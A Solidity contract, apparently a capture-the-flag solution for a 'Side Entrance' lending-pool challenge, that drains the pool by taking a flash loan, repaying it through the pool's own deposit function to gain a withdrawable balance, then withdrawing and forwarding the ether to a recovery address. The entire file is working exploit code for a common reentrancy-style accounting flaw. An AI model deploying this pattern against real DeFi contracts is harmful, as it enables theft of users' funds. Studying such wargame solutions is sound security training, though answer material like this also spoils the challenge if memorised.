// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance {
    ISideEntranceLenderPool private immutable pool;
    uint256 private immutable etherInPool;
    address private immutable player;
    address private immutable recovery;

    constructor(address _pool, uint256 _amount, address _player, address _recovery) {
        pool = ISideEntranceLenderPool(_pool);
        etherInPool = _amount;
        player = _player;
        recovery = _recovery;
    }

    function attack() external {
        require(msg.sender == player);

        pool.flashLoan(etherInPool);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, etherInPool);
    }

    function execute() external payable {
        pool.deposit{value: etherInPool}();
    }

    receive() external payable {}
}
